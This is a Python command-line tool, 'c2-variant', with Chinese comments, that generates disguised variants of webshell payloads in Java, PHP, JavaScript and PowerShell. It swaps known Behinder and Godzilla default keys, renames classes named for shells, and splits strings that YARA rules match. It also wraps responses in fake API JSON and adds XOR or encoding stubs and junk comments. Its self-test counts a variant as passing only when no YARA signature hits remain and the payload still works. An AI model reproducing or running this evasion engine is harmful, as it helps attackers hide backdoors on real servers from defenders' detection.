#!/usr/bin/env python3
"""c2-variant — 分层变换变体引擎(公开技术组装)v3.1。
用法:
  c2-variant.py gen --src payload --out dir --rounds 3 [--families mask,decomp,id,enc,code,struct]
                    [--rules /path] [--corpus corpus.json]
  c2-variant.py selftest [--basetypes DIR] [--rules DIR]
  c2-variant.py fingerprint <file>
变换族:
  mask   伪装令执行族(确定性,明文层先行):密钥轮换/字段名/路径/响应JSON包裹/禁词类名
  decomp 签名感知分解:Java \\uXXXX/PHP 拆分+可变函数/JS 计算成员/PS 动态方法名+hoist
  id     语义池类名+php 变量随机+语言感知垃圾注释
  enc    XOR 演示桩(无加载桩模板→守卫必弃,如实)
  code   自定义字母表 b64 桩(同上)
  struct 垃圾注释(java/js 块;php/ps 行尾)
功能核守卫:标记+php -l;EDUSRC:exit 76。
"""
import sys, os, json, base64, random, string, uuid, re, subprocess, tempfile, glob, secrets
from _common import FAMILIES, scope_gate_full, _data_root, edusrc_gate, sha256f


# CS54-P2: FAMILIES 单源 _common(此前本地手抄)。
RULE_DIR = os.path.join(_data_root(), 'c2/yara-rules')  # CS10-4
MASK_DEFAULT_KEYS = ['e45e329feb5d925b', '3c6e0b8a9c15224a', 'rebeyond', 'key321']
MASK_QUOTED_VALUES = ['pass', 'key', 'md5']
MASK_FIELDS = {'cmd': 'log_id', 'exec': 'task_run', 'connect': 'report_up'}
MASK_PATHS = {'/ctrl': '/api/log/report'}
MASK_CLASS_BANNED = ['shell', 'memshell', 'payload', 'cmd', 'connect', 'behinder', 'godzilla', 'evil', 'ghost', 'ice']
SEMANTIC_CLASSES = ['SessionEncodingUtil', 'LogReportHelper', 'TraceConfigLoader',
                    'CommonReportHandler', 'ApiSessionService', 'ReportDataBinder']

def class_banned(cn):
    """禁词类名判定:驼峰分词;长词(≥7)子串,短歧义词整词——防 ice/service 误报。"""
    import re as _re
    low = str(cn).lower()
    toks = [t.lower() for t in _re.findall(r'[A-Z]?[a-z]+|[A-Z]+(?![a-z])', str(cn))]
    long_w = [w for w in MASK_CLASS_BANNED if len(w) >= 7]
    short_w = [w for w in MASK_CLASS_BANNED if len(w) < 7]
    if any(w in low for w in long_w):
        return True
    return any(w in toks for w in short_w)

COLLATERAL = {
    'java': ['getRuntime', 'getMethod', 'getDeclaredConstructor', 'newInstance', 'getWriter'],
    'php': ['base64_decode', 'gzinflate', 'str_rot13', 'shell_exec'],
    'js': ['WScript.Shell', 'Scripting.FileSystemObject'],
    'ps': ['Invoke-Expression', 'DownloadString', 'Net.WebClient'],
}


def rand_name(n=8, prefix='a'):
    return prefix + ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n - 1))

def _rand_token(n, hexed=False):
    return secrets.token_hex((n + 1) // 2)[:n] if hexed else \
        ''.join(secrets.choice('abcdefghijklmnopqrstuvwxyz0123456789') for _ in range(n))

def core_guard(body, ext):
    if 'SPECTRE-MARK' not in body:
        return False, 'marker-missing'
    if ext == 'php':
        # CS32-F1: php 缺失干净 SKIP(此前 FileNotFoundError 裸栈)。
        import shutil
        if not shutil.which('php'):
            print('[c2-variant] php 不在 PATH——语法校验跳过(容器位内置; 宿主自装)', file=sys.stderr)
            return True, 'php-syntax SKIP(php 未装)'
        with tempfile.NamedTemporaryFile('w', suffix='.php', delete=False) as t:
            t.write(body); tmp = t.name
        try:
            r = subprocess.run(['php', '-l', tmp], capture_output=True, text=True, timeout=30)
            if r.returncode != 0:
                return False, 'php-lint-fail:' + r.stdout.strip()[:60]
        finally:
            os.unlink(tmp)
    return True, 'ok'

def php_lint(body):
    with tempfile.NamedTemporaryFile('w', suffix='.php', delete=False) as t:
        t.write(body); tmp = t.name
    try:
        return subprocess.run(['php', '-l', tmp], capture_output=True, text=True, timeout=30).returncode == 0
    finally:
        os.unlink(tmp)

def yara_string_hits(path):
    hits = []
    for rf in sorted(glob.glob(RULE_DIR + '/*.yar') + glob.glob(RULE_DIR + '/*.yara')):
        try:
            r = subprocess.run(['yara', '-s', rf, path], capture_output=True, text=True, timeout=60)
        except Exception:
            continue
        for line in r.stdout.splitlines():
            m = re.match(r'^(0x[0-9a-fA-F]+):(\$[\w]+): ?(.*)$', line)
            if m:
                hits.append((int(m.group(1), 16), m.group(3)))
    return hits

def string_mask(src):
    mask, cmt = {}, set()
    i, n, q = 0, len(src), None
    while i < n:
        c = src[i]
        if q:
            mask[i] = q
            if c == '\\' and i + 1 < n:
                mask[i + 1] = q; i += 2; continue
            if c == q:
                q = None
            i += 1; continue
        if c in ('"', "'"):
            q = c; mask[i] = q; i += 1; continue
        if c == '/' and i + 1 < n and src[i + 1] == '/':
            j = src.find('\n', i); j = n if j == -1 else j
            cmt.update(range(i, j)); i = j; continue
        if c == '/' and i + 1 < n and src[i + 1] == '*':
            j = src.find('*/', i + 2); j = n if j == -1 else j + 2
            cmt.update(range(i, j)); i = j; continue
        if c == '#':
            j = src.find('\n', i); j = n if j == -1 else j
            cmt.update(range(i, j)); i = j; continue
        i += 1
    return mask, cmt

def _halves(s):
    k = max(1, len(s) // 2)
    return s[:k], s[k:]

def decomp_string(src, s, ext, mask, cmt=(), skip=()):
    if not s or len(s) < 2 or s in skip:
        return src, 0
    occ = []
    i = src.find(s)
    while i != -1:
        occ.append(i); i = src.find(s, i + 1)
    if not occ:
        return src, 0
    out, hoists, n = src, [], 0
    for off in sorted(occ, reverse=True):
        end = off + len(s)
        rep = None
        in_str = mask.get(off)
        in_cmt = off in cmt
        if ext == 'java':
            for k in range(len(s)):
                if s[k].isalpha():
                    rep = s[:k] + '\\u%04x' % ord(s[k]) + s[k + 1:]
                    break
        elif ext in ('php', 'js', 'ps'):
            q = in_str or '"'
            op = {'php': '.', 'js': '+', 'ps': '+'}[ext]
            if in_str or in_cmt:
                a, b = _halves(s)
                rep = a + q + ' ' + op + ' ' + q + b
            elif ext == 'php':
                if re.fullmatch(r'\$[_A-Za-z][_A-Za-z0-9]*', s):
                    if s.startswith('$_'):
                        a, b = _halves(s[1:])
                        rep = "${'" + a + "'" + op + "'" + b + "'}"
                else:
                    core = s[:-1] if s.endswith('(') else s
                    is_call = s.endswith('(') or (end < len(out) and out[end] == '(')
                    if is_call and re.fullmatch(r'[_A-Za-z][_A-Za-z0-9]*', core):
                        a, b = _halves(core)
                        rep = "('" + a + "'" + op + "'" + b + "')" + ('(' if s.endswith('(') else '')
            elif ext == 'js':
                if re.fullmatch(r'new [_A-Za-z][_A-Za-z0-9]*', s):
                    a, b = _halves(s[4:])
                    rep = 'new this["' + a + '" + "' + b + '"]'
            elif ext == 'ps':
                prev = out[off - 1] if off > 0 else ''
                if re.fullmatch(r'[_A-Za-z][_A-Za-z0-9]*\(', s):        # m( -> $m(
                    v = '$m' + uuid.uuid4().hex[:4]
                    a, b = _halves(s[:-1])
                    hoists.append(v + " = '" + a + "'+'" + b + "'")
                    rep, end = v, end - 1
                elif prev == ':' and re.fullmatch(r'[_A-Za-z][_A-Za-z0-9]*', s):
                    v = '$m' + uuid.uuid4().hex[:4]                       # [T]::m -> [T]::$m
                    a, b = _halves(s)
                    hoists.append(v + " = '" + a + "'+'" + b + "'")
                    rep = v
                elif '.' in s:
                    k = s.index('.')
                    right = s[k + 1:]                                     # p.m -> p.$m
                    if re.fullmatch(r'[_A-Za-z][_A-Za-z0-9]*', right):
                        v = '$m' + uuid.uuid4().hex[:4]
                        a, b = _halves(right)
                        hoists.append(v + " = '" + a + "'+'" + b + "'")
                        rep = s[:k] + '.' + v
        if rep is not None:
            out = out[:off] + rep + out[end:]
            n += 1
    if hoists:
        out = '\n'.join(hoists) + '\n' + out
    return out, n

def fam_decomp(src, ext, srcpath):
    if srcpath is None:
        return None, 'no-srcpath'
    with tempfile.NamedTemporaryFile('w', suffix='.' + ext, delete=False) as t:
        t.write(src); tmp = t.name
    try:
        hits = yara_string_hits(tmp)
    finally:
        os.unlink(tmp)
    sigs = sorted({h[1] for h in hits if h[1] and len(h[1]) >= 2})
    coll = COLLATERAL.get(ext, []) if os.environ.get('C2_COLLATERAL') == '1' else []
    sigs = list(sigs) + [c for c in coll if c in src and c not in sigs]
    if not sigs:
        return None, 'no-usable-signatures'

    def build(skip=()):
        out, note = src, []
        for s in sigs:
            mask, cmt = string_mask(out)
            new, n = decomp_string(out, s, ext, mask, cmt, skip)
            if n:
                out = new
                note.append(s[:24] + 'x' + str(n))
        return out, note

    out, note = build()
    if not note:
        return None, 'nothing-rewritable:' + ','.join(s[:12] for s in sigs)[:100]
    if ext == 'php' and not php_lint(out):
        out, note = build(skip=tuple(s for s in sigs if s.startswith('$_')))
        if not note or not php_lint(out):
            return None, 'php-lint-fallback-failed'
    return out, ';'.join(note)

def fam_mask(src, ext):
    keys, out = {}, src
    for k in MASK_DEFAULT_KEYS:
        if k in out:
            nk = _rand_token(len(k), hexed=all(c in '0123456789abcdef' for c in k))
            out = out.replace(k, nk); keys['key:' + k] = nk
    for qv in MASK_QUOTED_VALUES:
        for qq in ('"', "'"):
            if qq + qv + qq in out:
                nq = _rand_token(10)
                out = out.replace(qq + qv + qq, qq + nq + qq); keys['value:' + qv] = nq
    for old, new in MASK_FIELDS.items():
        for qq in ('"', "'"):
            if qq + old + qq in out:
                out = out.replace(qq + old + qq, qq + new + qq); keys['field:' + old] = new
    for old, new in MASK_PATHS.items():
        if old in out:
            out = out.replace(old, new); keys['path:' + old] = new
    # ⑦④ 响应面业务 JSON 包裹+随机填充
    if '"request_id"' not in out:
        if ext == 'php':
            out2 = re.sub(r'echo\s+([^;{]+);',
                          lambda mm: 'echo json_encode(array("code"=>0,"msg"=>"ok","data"=>(' + mm.group(1) +
                                     '),"request_id"=>bin2hex(random_bytes(4))));', out)
            if out2 != out:
                out = out2; keys['wrap:resp'] = 'php-json-envelope'
        elif ext == 'java':
            out2 = re.sub(r'(\w+)\.getWriter\(\)\.write\((.+?)\);',
                          lambda mm: mm.group(1) + '.setContentType("application/json");' + mm.group(1) +
                                     '.getWriter().write("{\\"code\\":0,\\"msg\\":\\"ok\\",\\"data\\":\\"" + (' + mm.group(2) +
                                     ') + "\\",\\"request_id\\":\\"" + java.util.UUID.randomUUID() + "\\"}");', out)
            if out2 != out:
                out = out2; keys['wrap:resp'] = 'java-json-envelope'
        elif ext == 'ps':
            def _ps_wrap(mm):
                inner = mm.group(1)
                Q, D = chr(39), chr(34)
                # PS 源码:JSON 壳(单引号串) + "$inner"(双引号=原生 $var 插值) + [guid] 随机填充
                return ('Write-Output (' + Q + '{"code":0,"msg":"ok","data":"' + Q + ' + ' + D + inner + D +
                        ' + ' + Q + '","request_id":"' + Q + ' + [guid]::NewGuid().ToString(' + D + 'N' + D +
                        ').Substring(0,8) + ' + Q + '"}' + Q + ')')
            out2 = re.sub(r'Write-Output\s+"(.+?)"\s*$', _ps_wrap, out, flags=re.M)
            if out2 != out:
                out = out2; keys['wrap:resp'] = 'ps-json-envelope'
    # ⑤ 禁词类名语义化
    for m in list(re.finditer(r'class\s+([A-Za-z_]\w*)', out)):
        cn = m.group(1)
        if class_banned(cn):
            nc = SEMANTIC_CLASSES[hash(cn) % len(SEMANTIC_CLASSES)]
            out = out.replace(cn, nc); keys['class:' + cn] = nc
    return out, keys

def fam_id(src, ext=None):
    ids = set(re.findall(r'\bclass\s+([A-Za-z_]\w{3,20})', src))
    out = src
    for i in ids:
        if class_banned(i) or random.random() < 0.5:
            out = out.replace(i, SEMANTIC_CLASSES[hash((i, uuid.uuid4().hex)) % len(SEMANTIC_CLASSES)])
        else:
            out = out.replace(i, rand_name(random.randint(8, 14), random.choice('bcdefg')))
    if ext == 'php':
        SUPER = {'$_REQUEST', '$_POST', '$_GET', '$_SERVER', '$_COOKIE', '$_FILES', '$_ENV'}
        vs = set(re.findall(r'(\$[a-zA-Z_]\w{2,20})', out)) - SUPER
        for v in vs:
            out = re.sub(re.escape(v) + r'(?![\w])', '$v' + uuid.uuid4().hex[:6], out)
    junk = ('# ' if ext == 'ps' else '// ') + uuid.uuid4().hex[:18]
    if ext == 'php':
        idx = out.find('<?php')
        if idx != -1:
            eol = out.find('\n', idx)
            return out[:eol + 1] + junk + '\n' + out[eol + 1:]
        return junk + '\n' + out
    return junk + '\n' + out

def fam_enc(src):
    key = random.randbytes(8)
    data = bytes(b ^ key[i % len(key)] for i, b in enumerate(src.encode()))
    return (f'// {uuid.uuid4().hex}\nSTRING_K = "{key.hex()}";\nSTRING_D = "{base64.b64encode(data).decode()}";\n'
            '// runtime: decode->xor->eval/load  (加载桩由目标栈模板提供)\n')

def fam_code(src):
    alph = ''.join(random.sample((string.ascii_letters + string.digits + '+/='), 64))
    std = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    return f'ALPH = "{alph}";\nDATA = "{base64.b64encode(src.encode()).decode().translate(str.maketrans(std, alph))}";\n// decode via ALPH->std map\n'

def fam_struct(src, ext=None):
    out = []
    if ext in ('php', 'ps'):
        tok = '#' if ext == 'ps' else '//'
        in_php = False  # BUG-1: 块状态跟踪——php 的 // 注释必须落在
        # <?php 块内;块外(HTML 文本)注入裸 // 会污染响应面伪装
        for l in src.split('\n'):
            if '<?php' in l or '<?=' in l:
                in_php = True
            if '?>' in l:
                # 该行仍属块内(?> 在行尾);注释可加,之后出块
                st = l.strip()
                if (random.random() < 0.15 and st and in_php
                        and not st.startswith(('<?', '?>'))):
                    out.append(l + '  ' + tok + ' ' + uuid.uuid4().hex[:12])
                else:
                    out.append(l)
                in_php = False
                continue
            st = l.strip()
            if (random.random() < 0.15 and st and in_php
                    and not st.startswith(('<?', '?>'))):
                out.append(l + '  ' + tok + ' ' + uuid.uuid4().hex[:12])
            else:
                out.append(l)
        return '\n'.join(out)
    for l in src.split('\n'):
        if random.random() < 0.15:
            out.append(f'/* {uuid.uuid4().hex[:12]} */')
        out.append(l)
    return '\n'.join(out)

FAM_FN = {'id': fam_id, 'enc': fam_enc, 'code': fam_code, 'struct': fam_struct}

def cmd_gen(args):
    a = dict(zip(args[::2], args[1::2]))
    # CS41-A4 门序契约: -h→EDUSRC(76)→scope(75)→用法(2)→引擎(2)——
    # 授权先于用法校验(族内八工具统一; 此前参验在门前致同态退出码分叉)。
    edusrc_gate([a.get('--src', ''), a.get('--out', '')])
    scope_gate_full()
    # R32D58-F3: 必填参缺失干净 usage rc=2(此前 KeyError 裸栈 rc=1)。
    if '--src' not in a or '--out' not in a:
        print('用法: c2-variant.py gen --src <payload> --out <dir> [--rounds N] [--families ...]', file=sys.stderr)
        return 2
    global RULE_DIR
    if a.get('--rules'):
        RULE_DIR = a['--rules']
    # R32D60-NEW4: --src 不存在→干净 rc=2(此前裸栈 rc=1)。
    if not os.path.isfile(a['--src']):
        print(f"用法错误: --src 文件不存在或不是常规文件: {a['--src']}", file=sys.stderr); return 2
    # R32D75-F4: 非 UTF-8 源容错读取(此前 UnicodeDecodeError 裸栈)。
    src = open(a['--src'], errors='replace').read()
    srcpath = a['--src']
    outdir = a.get('--out', '/tmp/c2-variants')
    rounds = int(a.get('--rounds', '3'))
    fams = a.get('--families', ','.join(FAMILIES)).split(',')
    raw_ext = (os.path.splitext(a['--src'])[1] or '.txt').lstrip('.')
    ext = {'ps1': 'ps', 'psm1': 'ps', 'hta': 'js', 'jscript': 'js'}.get(raw_ext, raw_ext)
    # R32D73-NEW2: 未知族名干净 rc=2(此前拼写错被吞静默回退全族池,
    # 变形族归因失真)。
    bad_fams = [f for f in fams if f and f not in FAMILIES]
    # CS53-NEW-A: 全空规格(''/',')与未知名同拒——此前静默零产出 rc=0。
    if not any(fams):
        print(f"用法错误: --families 至少一个合法族名(合法: {','.join(FAMILIES)})", file=sys.stderr)
        return 2
    if bad_fams:
        print(f"用法错误: --families 未知族名: {','.join(bad_fams)}(合法: {','.join(FAMILIES)})", file=sys.stderr)
        return 2
    fam_pool = [f for f in fams if f in FAMILIES]
    os.makedirs(outdir, exist_ok=True)
    corpus_path = a.get('--corpus')
    corpus = json.load(open(corpus_path)) if corpus_path and os.path.exists(corpus_path) else []
    manifest, emitted = [], 0
    for r in range(rounds):
        used, note, mask_keys = [], [], {}
        body = src
        chosen = []
        if 'mask' in fam_pool:
            chosen.append('mask')
        if 'decomp' in fam_pool:
            chosen.append('decomp')
        rest = [f for f in fam_pool if f not in ('mask', 'decomp')]
        if rest:
            # PAPERCUT-1: k=random.randint(0,...) 可取 0——单家族轮
            # (如 --families struct)3 连空转;保证 chosen 非空
            k = random.randint(0, min(2, len(rest)))
            if not chosen and k == 0:
                k = 1
            chosen += random.sample(rest, k=k)
        for f in chosen:
            if f == 'mask':
                body, mask_keys = fam_mask(body, ext)
                used.append('mask')
                note.append('mask:' + (','.join(list(mask_keys)[:6]) or 'no-op'))
            elif f == 'decomp':
                new, info = fam_decomp(body, ext, srcpath)
                if isinstance(new, str):
                    body = new; used.append('decomp'); note.append(str(info)[:160])
                else:
                    note.append('decomp-skip:' + str(info)[:90])
            else:
                try:
                    if f == 'id':
                        body = fam_id(body, ext)
                    elif f == 'struct':
                        body = fam_struct(body, ext)
                    else:
                        body = FAM_FN[f](body)
                    used.append(f)
                except Exception as e:
                    note.append(f + '-error:' + str(e)[:60])
        if not used:
            manifest.append({'round': r + 1, 'guard': 'skip', 'note': ';'.join(note)[:220]})
            continue
        ok, why = core_guard(body, ext)
        if not ok:
            manifest.append({'round': r + 1, 'families': used, 'guard': 'fail:' + why,
                             'note': ';'.join(note)[:180]})
            continue
        emitted += 1
        p = os.path.join(outdir, f'variant_{emitted}.{raw_ext}')
        open(p, 'w').write(body)
        sha = sha256f(p)
        if corpus_path is not None:
            if sha in corpus:
                os.unlink(p); emitted -= 1
                manifest.append({'round': r + 1, 'guard': 'dup-sha', 'note': sha[:16]})
                continue
            corpus.append(sha)
        manifest.append({'file': p, 'sha256': sha, 'families': used, 'round': r + 1,
                         'guard': 'pass', 'note': ';'.join(note)[:180],
                         'mask_keys': mask_keys or None})
    if corpus_path is not None:
        json.dump(corpus, open(corpus_path, 'w'), ensure_ascii=False)
    json.dump(manifest, open(os.path.join(outdir, 'manifest.json'), 'w'), ensure_ascii=False, indent=1)
    print(json.dumps(manifest, indent=1))
    return 0

def cmd_selftest(args):
    a = dict(zip(args[::2], args[1::2])) if args else {}
    global RULE_DIR
    if a.get('--rules'):
        RULE_DIR = a['--rules']
    bdir = a.get('--basetypes', os.path.join(_data_root(), 'c2/basetypes'))
    edusrc_gate([bdir])
    scope_gate_full()
    # R32D61-F6/CS40-1: java 缺失归因标志(此前锚点落错函数致 NameError)。
    import shutil
    java_missing = not shutil.which('java')
    # CS41-A1: 套件目录缺/非常规→干净 rc=2+供给指引(此前裸栈 rc=1)。
    if not os.path.isdir(bdir):
        print(f'SELFTEST 用法错误: 基型目录不存在或不是目录: {bdir}——检查 SPECTRE_DATA_DIR/tools-sync 交付', file=sys.stderr)
        return 2
    # CS41-A3: 空套件拒假绿(族内统一 c2-bytecode R32D57-NEW7 制式——
    # 此前 rc=0+SUMMARY 0 fail 但什么都没测)。
    entries = [f for f in sorted(os.listdir(bdir)) if not f.endswith('.bak')]
    if not entries:
        print(f'SELFTEST ERROR: 基型目录零载荷基型({bdir})——skills-seed/tools-sync 应已交付', file=sys.stderr)
        return 1
    fails = 0
    per_file_fail = []
    for f in entries:  # .bak 已在 entries 构造时滤除(CS42-F10: 死分支删)
        p = os.path.join(bdir, f)
        out = tempfile.mkdtemp(prefix='c2selftest-')
        g = subprocess.run([sys.executable, os.path.abspath(__file__), 'gen', '--src', p,
                            '--out', out, '--rounds', '1', '--families', 'mask,decomp'],
                           capture_output=True, text=True)
        cands = sorted(x for x in os.listdir(out) if x.startswith('variant_')) if os.path.isdir(out) else []
        if not cands:
            print(f'SELFTEST FAIL {f}: no guarded candidate: {(g.stdout + g.stderr).strip()[:160]}')
            fails += 1; per_file_fail.append((f, 'nocand')); continue
        vp = os.path.join(out, cands[0])
        resid = yara_string_hits(vp)
        dg = subprocess.run(['python3', os.path.join(_data_root(), 'bin/c2-disguise.py'), 'check', '--payload', vp],
                            capture_output=True, text=True)
        dgres = json.loads(dg.stdout) if dg.stdout.strip().startswith('{') else {'verdict': 'ERROR'}
        ft = subprocess.run([sys.executable, os.path.join(_data_root(), 'bin/c2-functest.py'), vp],
                            capture_output=True, text=True)
        ok = (not resid) and ft.returncode == 0 and dgres.get('verdict') != 'REJECT'
        why = ' [java 缺失——引擎供给问题非回归]' if (not ok and ft.returncode != 0 and f.endswith('.java') and java_missing) else ''
        print(f"SELFTEST {'OK  ' if ok else 'FAIL'} {f}: resid={len(resid)} ft={ft.returncode} disguise={dgres.get('verdict')} {str(dgres.get('bare_surfaces'))[:60]}{why}")
        if not ok:
            fails += 1; per_file_fail.append((f, f'ft={ft.returncode}'))
        shutil.rmtree(out, ignore_errors=True)
    # CS41-A2: 横幅归因与逐项同过滤(仅当确有 .java 车道 fail——此前
    # 纯 php fail 也被归因 java, 误导非回归判断)。
    java_fail = any(e[0].endswith('.java') and e[1].startswith('ft=') and e[1] != 'ft=0' for e in per_file_fail)
    print(f'SELFTEST SUMMARY: {fails} fail' + ('  [java 车道受引擎缺失影响——ft≠0 项非回归]' if java_missing and java_fail else ''))
    return 1 if fails else 0

def cmd_fingerprint(args):
    # R32D61-F1: 缺参干净 usage rc=2(此前 IndexError 裸栈)。
    if not args:
        print('用法: c2-variant.py fingerprint <payload>', file=sys.stderr); return 2
    print(sha256f(args[0]))
    return 0

def main():
    # R32D53: -h rc=0(家族统一)。
    if any(x in sys.argv[1:] for x in ('-h', '--help')):  # R32D76-N3: 任意位(对齐 phish 族)
        print(__doc__); return 0
    if len(sys.argv) < 2:
        print(__doc__); return 2
    cmd, args = sys.argv[1], sys.argv[2:]
    if cmd == 'gen': return cmd_gen(args)
    if cmd == 'fingerprint': return cmd_fingerprint(args)
    if cmd == 'selftest': return cmd_selftest(args)
    print(__doc__); return 2

if __name__ == '__main__':
    sys.exit(main() or 0)
